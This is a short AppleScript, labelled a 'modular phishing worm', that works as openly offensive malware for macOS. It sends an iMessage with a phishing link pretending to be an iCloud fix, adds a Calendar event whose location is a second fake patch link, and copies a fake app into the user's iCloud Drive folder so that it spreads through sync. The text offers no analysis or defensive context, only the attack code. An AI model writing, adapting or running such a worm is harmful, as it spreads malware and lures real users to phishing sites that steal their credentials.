-- Modular phishing worm
do shell script "osascript -e 'tell application \"Messages\" to send \"Update here: https://icloud-fix[.]site\" to buddy \"someone@example.com\" of service 1'"
delay 2
do shell script "osascript -e 'tell application \"Calendar\" to make new event at end of events of calendar \"Home\" with properties {summary:\"Fix\", location:\"https://icloud-patch[.]site\"}'"
delay 2
do shell script "cp -R /Users/Shared/FakeApp.app ~/Library/Mobile\\ Documents/com~apple~CloudDocs/"
